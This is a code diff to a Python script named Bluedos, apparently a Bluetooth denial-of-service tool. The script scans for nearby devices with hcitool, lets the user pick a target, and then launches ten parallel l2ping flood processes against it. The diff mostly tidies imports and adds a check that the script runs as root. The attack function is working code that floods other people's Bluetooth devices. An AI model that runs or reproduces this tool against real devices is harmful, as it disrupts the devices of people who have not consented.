@@ -1,5 +1,6 @@
 # Bluedos by @ceigh
-import subprocess
+from os import getuid
+from subprocess import check_output, Popen
 
 
 def confirm(question):
@@ -16,18 +17,17 @@ def bye():
     print("\nBye!")
     sleep(1)
     print("\033c")
-    exit(0)
 
 
 def get_devices():
     print("\033c")
-    if len(subprocess.check_output(['hcitool', 'dev'])[9:]):
+    if len(check_output(['hcitool', 'dev'])[9:]):
         print("Scanning...\n")
-        hcitool_out = subprocess.check_output(['hcitool', 'scan']).decode()[13:-1]
+        hcitool_out = check_output(['hcitool', 'scan']).decode()[13:-1]
         devices = [i.split('\t')[1:] for i in hcitool_out.split('\n') if len(hcitool_out) != 0]
         return devices
     else:
-        exit("Enable bluetooth first")
+        exit("Enable Bluetooth first")
 
 
 def attack(target):
@@ -35,8 +35,7 @@ def attack(target):
 
     def popen():
         for i in range(10):
-            subprocess.Popen(['sudo', 'l2ping', '-f', '-s', '660', target[0]],
-                             stderr=subprocess.STDOUT)
+            Popen(['l2ping', '-f', '-s', '660', target[0]])
 
     print(f"Attacking '{target[1]}'...\nTo stop type Ctrl+C")
     try:
@@ -71,4 +70,8 @@ def main():
         attack(devices[target_i])
 
 
-main()
+if __name__ == '__main__':
+    if not getuid():
+        main()
+    else:
+        exit("Run it as sudo")
